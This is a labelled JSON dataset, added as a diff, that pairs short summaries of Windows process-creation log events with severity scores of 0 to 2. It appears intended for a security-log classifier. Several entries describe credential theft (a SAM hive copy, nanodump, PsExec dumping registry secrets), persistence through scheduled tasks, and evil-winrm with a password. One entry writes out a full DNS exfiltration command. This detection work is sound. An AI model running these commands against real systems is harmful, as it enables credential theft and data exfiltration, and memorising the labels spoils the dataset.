+        "`conhost.exe` was launched without a parent process or command-line arguments, running under user `bazinga`.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\SearchProtocolHost.exe` (PID: 10840) was launched by `C:\\Windows\\System32\\SearchIndexer.exe`.",
+        0
+    ],
+    [
+        "`whoami.exe` (PID: 7576) was launched with the command: `\\\"C:\\Windows\\system32\\whoami.exe\\\"`. It was spawned by an unknown parent process (PID: 7468.0) and ran from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3\\` with a high integrity level.",
+        1
+    ],
+    [
+        "`conhost.exe` launched with missing parent process details.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` launched without detailed command or parent process information.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` launched from `SecureSLM\\Run4` directory.",
+        1
+    ],
+    [
+        "`powershell.exe` (PID: 9976) launched from `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\` under user `DESKTOP-DU6JNPV\\bazinga`. No parent process recorded.",
+        1
+    ],
+    [
+        "Process `whoami.exe` (PID: 6968) launched with no specified command, parent process, or integrity level.",
+        1
+    ],
+    [
+        "The `whoami.exe` process was executed, but the log lacks details about the spawning process or command parameters.",
+        1
+    ],
+    [
+        "`conhost.exe` launched with command: `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`.",
+        2
+    ],
+    [
+        "`powershell.exe` was executed from the `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` directory with a command referencing `CreateRemoteThread.exe`.",
+        2
+    ],
+    [
+        "`taskhostw.exe` executed from `AppData\\Roaming` directory.",
+        2
+    ],
+    [
+        "Process `powershell.exe` launched from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` with suspicious command.",
+        2
+    ],
+    [
+        "`backgroundTaskHost.exe` launched with empty command line and no parent process.",
+        0
+    ],
+    [
+        "`PktMon.exe` launched with no command-line arguments and no parent process.",
+        2
+    ],
+    [
+        "On 7/7/2025 11:11:57 AM, `SearchFilterHost.exe` (PID: 540) was executed, spawned by `SearchIndexer.exe` (PID: 4244).",
+        0
+    ],
+    [
+        "Process `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` (PID: 4596) was launched with no command-line arguments or parent process.",
+        1
+    ],
+    [
+        "Process `SearchFilterHost.exe` (PID: 8328) was launched under `SYSTEM`.",
+        0
+    ],
+    [
+        "`HOSTNAME.EXE` was launched under user `bazinga` with high integrity from the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` was launched by an unidentified parent process in a directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`hostname.exe` was executed again, this time from the `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` directory with a High Integrity level.",
+        1
+    ],
+    [
+        "`whoami.exe` executed from `Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "On 7/7/2025 8:23:49 PM, `HOSTNAME.EXE` (PID: 9480) was launched from `C:\\Windows\\System32` with no command-line arguments.",
+        0
+    ],
+    [
+        "`csc.exe` launched by PowerShell with the command `\\\"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe\\\" /noconfig /fullpaths @\\\"C:\\Users\\bazinga\\AppData\\Local\\Temp\\hdivxpnq\\hdivxpnq.cmdline\\\"`.",
+        2
+    ],
+    [
+        "`conhost.exe` (PID: 9656) launched by `PowerShell.exe` (PID: 4588).",
+        1
+    ],
+    [
+        "`powershell.exe` (PID 7588) was executed from the `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` directory with the command `Get-NetTCPConnection`. It was not spawned by a parent process (PID: 8924).",
+        2
+    ],
+    [
+        "`schtasks.exe` created two scheduled tasks: `T1053_005_OnLogon` and `T1053_005_OnStartup`, both configured to execute `cmd.exe /c calc.exe`. The process was spawned by `cmd.exe` and ran from a temporary directory.",
+        2
+    ],
+    [
+        "Process `HOSTNAME.EXE` was executed from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3\\` with a high integrity level.",
+        1
+    ],
+    [
+        "`conhost.exe` launched without a parent process or arguments.",
+        0
+    ],
+    [
+        "Processes like `SearchIndexer.exe`, `SearchProtocolHost.exe`, and `SearchFilterHost.exe` were launched with standard commands.",
+        0
+    ],
+    [
+        "Process `whoami.exe` was executed with no visible command-line arguments and no identifiable parent process.",
+        1
+    ],
+    [
+        "`whoami.exe` was launched under user `bazinga` with high integrity from the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\HOSTNAME.EXE` (PID: 8700) launched.",
+        1
+    ],
+    [
+        "`smartscreen.exe` (PID: 11896) launched.",
+        0
+    ],
+    [
+        "Process `whoami.exe` launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "Process `SearchFilterHost.exe` was launched by `SearchIndexer.exe` under `NT AUTHORITY\\SYSTEM`. Command: `C:\\Windows\\system32\\SearchFilterHost.exe`.",
+        0
+    ],
+    [
+        "Process `C:\\Windows\\System32\\whoami.exe` (PID: 2348) launched with no command-line arguments or parent process.",
+        1
+    ],
+    [
+        "Process `HOSTNAME.EXE` was launched without command or parent process information. User: `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "`cvtres.exe` (Visual C++ Resource Compiler) launched from `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319` with no command-line arguments. No parent process information available.",
+        1
+    ],
+    [
+        "Process `powershell.exe` was launched from `C:\\Users\\bazinga\\AppData\\Local\\Temp` with a command involving `ListPlanting.exe`.",
+        2
+    ],
+    [
+        "Process `HOSTNAME.EXE` was launched under `DESKTOP-DU6JNPV\\bazinga` with no parent process or command-line arguments specified.",
+        1
+    ],
+    [
+        "`hostname.exe` was executed with no command-line arguments. The process details are incomplete, and the parent process is undefined.",
+        1
+    ],
+    [
+        "Process `HOSTNAME.EXE` executed. No command-line arguments or parent process details provided. Ran under user `bazinga` with missing integrity level.",
+        1
+    ],
+    [
+        "Process `svchost.exe` (PID: 5720) launched with typical parameters (`-k smphost`) under the `NETWORK SERVICE` user.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\wbem\\WmiPrvSE.exe` was launched with the `-secured -Embedding` argument by `svchost.exe`. The process ran under `NT AUTHORITY\\ETWORK SERVICE` with an integrity level of `System`.",
+        0
+    ],
+    [
+        "`hostname.exe` launched repeatedly from `Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`backgroundTaskHost.exe` (PID: 4400) was launched with no command line arguments or parent process details.",
+        0
+    ],
+    [
+        "`UsoClient.exe` launched with no command line arguments or parent process details.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` (PID: 5016) was launched.",
+        2
+    ],
+    [
+        "`conhost.exe` (PID: 9296) launched using an unusual command line (`\\??\\C:\\Windows\\system32\\conhost.exe`) and was spawned by `powershell.exe` (PID: 2340) executing a script to register a scheduled task via WMI using XML from the `AtomicRedTeam` folder. The process ran with high integrity under user `bazinga`.",
+        2
+    ],
+    [
+        "Process `powershell.exe` was launched from a temporary directory (`C:\\Users\\bazinga\\AppData\\Local\\Temp\\`) with the same suspicious `Invoke-WebRequest` command.",
+        2
+    ],
+    [
+        "Process `conhost.exe` was launched by `powershell.exe`, which executed a command to interact with VMware services (`Connect-VIServer`).",
+        1
+    ],
+    [
+        "`cmd.exe` executed to echo a string.",
+        1
+    ],
+    [
+        "`backgroundTaskHost.exe` launched with empty command-line arguments and no parent process.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\whoami.exe` was executed, but the parent process and other details are missing. It ran under user `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "Process `HOSTNAME.EXE` was executed with command `\\\"C:\\Windows\\system32\\HOSTNAME.EXE\\\"` by an unknown parent process (`-`). The process ran from the directory `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`whoami.exe` was executed from the `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` directory with an integrity level of `High`.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` executed with the command:  `C:\\Windows\\system32\\HOSTNAME.EXE`.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\conhost.exe` (PID: 4784) was launched by PowerShell (PID: 5016) with the command: `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`.",
+        2
+    ],
+    [
+        "`svchost.exe` (PID: 8868) launched.",
+        0
+    ],
+    [
+        "Process `SearchFilterHost.exe` was launched by `SearchIndexer.exe` with normal command-line arguments under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "On 7/7/2025 6:42:35 PM, `powershell.exe` (PID: 9196) executed the same malicious script (`Invoke-MalDoc.ps1`) from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\`.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 2928) was launched by PowerShell (PID: 1964) to determine the hostname of the machine.",
+        1
+    ],
+    [
+        "`powershell.exe` (PID: 12788) launched `EarlyBird.exe` from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\`.",
+        2
+    ],
+    [
+        "`conhost.exe` was launched with no command-line arguments. Parent process information is missing.",
+        0
+    ],
+    [
+        "Process `SearchProtocolHost.exe` (PID: 7600) was launched under the user `bazinga`.",
+        0
+    ],
+    [
+        "Process `HOSTNAME.EXE` (PID: 2916) launched without a parent process or command-line arguments. The process ran under user `bazinga`.",
+        1
+    ],
+    [
+        "Microsoft Calculator application launched by `sihost.exe`.",
+        0
+    ],
+    [
+        "`whoami.exe` was launched without a clear parent process (PID: -1) and ran without specifying a directory or integrity level.",
+        1
+    ],
+    [
+        "Process `WmiPrvSE.exe` (PID: 12748) was launched from `svchost.exe` (PID: 916.0) with a system integrity level.",
+        0
+    ],
+    [
+        "`cmd.exe` executed a command to copy `cscript.exe` to `AppData` as `notepad.exe`, then executed it.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` (PID: 9684) launched in `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`hostname.exe` (PID: 8516) was invoked by `powershell.exe` (PID: 4000).",
+        1
+    ],
+    [
+        "`conhost.exe` (PID 11736) was launched without a parent process specified.",
+        0
+    ],
+    [
+        "`GoogleUpdater.exe` processes were launched under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "Process `C:\\Windows\\System32\\whoami.exe` (PID: 3472) was launched with no command-line arguments or parent process.",
+        1
+    ],
+    [
+        "PowerShell process (`PID: 1708`) executed with an obfuscated command. The process originated from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` under `High` integrity level.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\conhost.exe` (PID: 10152) was launched by PowerShell (PID: 9080) with a suspicious command-line.",
+        2
+    ],
+    [
+        "Event ID 5 indicates `whoami.exe` (PID: 13956) was launched with no command-line arguments. The parent process and directory are undefined.",
+        1
+    ],
+    [
+        "Process `conhost.exe` (PID: 2272) executed with the command `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`, spawned by `powershell.exe`.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` launched with no command-line arguments and missing parent process information.",
+        2
+    ],
+    [
+        "Process `HOSTNAME.EXE` executed from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`. Command-line used: `\\\"C:\\Windows\\system32\\HOSTNAME.EXE\\\"`. Ran under user `bazinga` with high integrity level.",
+        1
+    ],
+    [
+        "Process `C:\\Windows\\System32\\SearchProtocolHost.exe` (PID: 6312) was launched by `SearchIndexer.exe`.",
+        0
+    ],
+    [
+        "`HOSTNAME.EXE` was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under user `bazinga`.",
+        2
+    ],
+    [
+        "`whoami.exe` (PID: 10040) executed with command: `\\\"C:\\Windows\\system32\\whoami.exe\\\"`, spawned by `powershell.exe` (PID: 4000). Working directory: `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3\\`.",
+        1
+    ],
+    [
+        "A PowerShell process was executed with the same command as in Log Entry 1, attempting to copy the `SAM` registry hive from a shadow copy to the temporary directory. It was launched by another PowerShell process running from a temporary directory.",
+        2
+    ],
+    [
+        "Process `conhost.exe` launched by `cmd.exe` related to `nanodump.x64.exe` execution.",
+        1
+    ],
+    [
+        "Process `HOSTNAME.EXE` (PID: 2392) launched by an unknown parent process (`PID: 7468`) from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run3\\`.",
+        1
+    ],
+    [
+        "Event ID 1 - Execution of `cmd.exe` to launch `nanodump.x64.exe`.",
+        2
+    ],
+    [
+        "`SearchProtocolHost.exe` launched by `SearchIndexer.exe` under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` launched.",
+        1
+    ],
+    [
+        "`svchost.exe` (PID 12648) was launched without a parent process specified.",
+        0
+    ],
+    [
+        "Process `HOSTNAME.EXE` launched by `powershell.exe` from a non-standard directory (`Documents\\SecureSLM\\Run3`).",
+        1
+    ],
+    [
+        "`SearchProtocolHost.exe` (`PID: 788`) executed by `SearchIndexer.exe` (`PID: 4244`) with standard arguments. Process ran under `SYSTEM` user in `C:\\Windows\\system32\\` with a `System` integrity level.",
+        0
+    ],
+    [
+        "Process `C:\\Windows\\System32\\conhost.exe` (PID: 4928) was launched with the command `\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1`. It was spawned by PowerShell (PID: 4596) running a suspicious script involving `New-NetEventSession` and packet capture operations.",
+        2
+    ],
+    [
+        "`HOSTNAME.EXE` was executed with no associated command line or parent process information.",
+        1
+    ],
+    [
+        "Process `conhost.exe` was launched by `powershell.exe` with the command that includes copying `cmd.exe` to `C:\\ProgramData\\`. User: `DESKTOP-DU6JNPV\\bazinga`.",
+        2
+    ],
+    [
+        "Process `SearchProtocolHost.exe` launched by `SearchIndexer.exe` under `NT AUTHORITY\\SYSTEM`.",
+        0
+    ],
+    [
+        "The `HOSTNAME.EXE` process was executed, but the log lacks details about the spawning process or command parameters.",
+        1
+    ],
+    [
+        "`HxTsr.exe` (PID 1948) was launched with a specific `ServerName` parameter.",
+        0
+    ],
+    [
+        "`cmd.exe` (PID: 9984) was launched with no command line arguments, no parent process, and ran under user `bazinga`.",
+        1
+    ],
+    [
+        "`SearchProtocolHost.exe` (PID: 8216) launched by `SearchIndexer.exe` (PID: 4244).",
+        0
+    ],
+    [
+        "`HOSTNAME.EXE` launched.",
+        1
+    ],
+    [
+        "`HOSTNAME.EXE` launched with missing parent process details.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\calc.exe` launched from `C:\\Users\\bazinga\\AppData\\Local\\Temp\\` by `WerFault.exe`.",
+        2
+    ],
+    [
+        "`svchost.exe` launched with `netsvcs` and `gpsvc`.",
+        0
+    ],
+    [
+        "`svchost.exe` executed.",
+        0
+    ],
+    [
+        "On 7/7/2025 11:27:52 AM, Event ID 5 occurred. Process `powershell.exe` was launched, but its parent process and command line are missing.",
+        2
+    ],
+    [
+        "`whoami.exe` was executed from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` with high integrity.",
+        1
+    ],
+    [
+        "On 7/7/2025 1:40:04 PM, `WmiPrvSE.exe` (PID: 14536) was launched with the command `C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding`. It was spawned by `svchost.exe` (PID: 916.0) running under `NT AUTHORITY\\ETWORK SERVICE` with `System` integrity level.",
+        0
+    ],
+    [
+        "`whoami.exe` launched without command or parent process details.",
+        1
+    ],
+    [
+        "`C:\\Windows\\System32\\wbem\\WmiPrvSE.exe` (PID: 1732) was launched by `svchost.exe`.",
+        0
+    ],
+    [
+        "`cmd.exe` was launched by `powershell.exe` to execute `PsExec.exe` and save registry secrets to `%temp%`.",
+        2
+    ],
+    [
+        "Event ID 1: `powershell.exe` launched.  - Command:    ```  powershell.exe & {Import-Module \\\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\dnsexfil.ps1\\\"   Invoke-DNSExfiltrator -i \\\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\dnsexfil.ps1\\\" -d target.example.com -p atomic -doh google -t 500}  ```- Parent Process: Not recorded (PID: 8924.0).  - Directory: `C:\\Users\\bazinga\\AppData\\Local\\Temp`.  - User: `DESKTOP-DU6JNPV\\bazinga`.",
+        2
+    ],
+    [
+        "On 7/7/2025 1:40:04 PM, `powershell.exe` (PID: 13840) was launched with no command-line arguments. It was spawned by an unknown parent process (PID: -1).",
+        1
+    ],
+    [
+        "`powershell.exe` was launched from the `AppData\\Local\\Temp` directory, executing the same command as Entry 1.",
+        2
+    ],
+    [
+        "Process `WmiPrvSE.exe` was launched by `svchost.exe` with legitimate parameters.",
+        0
+    ],
+    [
+        "Process `C:\\Windows\\System32\\conhost.exe` (PID: 7600) was launched by `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe` with the command: `\\\"powershell.exe\\\" & {evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1}`.",
+        2
+    ],
+    [
+        "Process `conhost.exe` was launched by `powershell.exe` with a suspicious command that downloads and executes a PowerShell script from an external URL. The script appears to invoke a macro-related operation.",
+        2
+    ],
+    [
+        "A suspicious process named `lsass.exe` was launched from the `C:\\Windows\\Temp` directory under user `bazinga`.",
+        2
+    ],
+    [
+        "`whoami.exe` was launched with no parent process or command details.",
+        1
+    ],
+    [
+        "Process `conhost.exe` (PID: 2624) was launched with no command or parent process details.",
+        0
+    ],
+    [
+        "`WmiPrvSE.exe` (PID: 7452) launched by `svchost.exe` (PID: 916).",
+        0
+    ],
+    [
+        "Process `HOSTNAME.EXE` was launched from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\` under `DESKTOP-DU6JNPV\\bazinga`.",
+        1
+    ],
+    [
+        "On 7/7/2025 6:42:34 PM, `HOSTNAME.EXE` (PID: 5652) was executed from `C:\\Users\\bazinga\\Documents\\SecureSLM\\Run4\\`.",
+        1
+    ],
+    [
+        "`whoami.exe` was launched without a parent process or command-line arguments, running under user `bazinga`.",
+        1
+    ],
+    [
+        "SearchFilterHost.exe launched by SearchIndexer.exe under SYSTEM user context.",
+        0
+    ],
+    [
+        "`SearchProtocolHost.exe` (PID: 14972) launched by `SearchIndexer.exe` (PID: 4244).",
+        0
+    ],
+    [
+        "`whoami.exe` executed by `powershell.exe` in a directory associated with user documents.",
+        1
+    ],
+    [
+        "On 7/7/2025 6:42:34 PM, `whoami.exe` (PID: 5844) was launched, but the process metadata (parent process, integrity level, etc.) is incomplete.",
+        1
+    ],
+    [
+        "`WmiPrvSE.exe` (PID: 5368) was launched from `C:\\Windows\\system32\\wbem\\` by `svchost.exe` with the `DcomLaunch` service.",
+        0
+    ],
+    [
+        "Process `svchost.exe` launched by `services.exe` with typical service-related arguments.",
+        0
+    ]
+]
